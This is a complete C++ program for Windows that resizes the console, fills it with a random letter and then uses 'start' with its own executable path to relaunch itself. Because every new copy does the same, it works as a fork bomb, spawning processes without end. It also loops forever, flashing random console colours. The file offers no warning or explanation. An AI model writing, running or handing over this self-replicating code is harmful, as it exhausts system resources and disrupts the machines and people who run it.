#include <iostream>
#include <Windows.h>
#include <string>
#include <time.h>

using namespace std;

const int WINDOW_COLS = 100;
const int WINDOW_LINES = 30;

int main() {
	setlocale(LC_ALL, "RUS");
	srand(time(0));

	string values = "0123456789ABCDEF";

	string command = "mode con: cols=" + to_string(WINDOW_COLS) + " lines=" + to_string(WINDOW_LINES);
	cout << command << endl;
	system(command.c_str());
	cout << string(WINDOW_COLS * WINDOW_LINES, rand() % ('Z' - 'A') + ('A'));

	char fileName[MAX_PATH];
	GetModuleFileNameA(nullptr, fileName, MAX_PATH);
	system((string("start ") + fileName).c_str());

	while (true) {
		command = "color ";
		command += values[rand() % values.length()];
		command += values[rand() % values.length()];
		system(command.c_str());
		Sleep(100);
	}

	system("pause");
	return 0;
}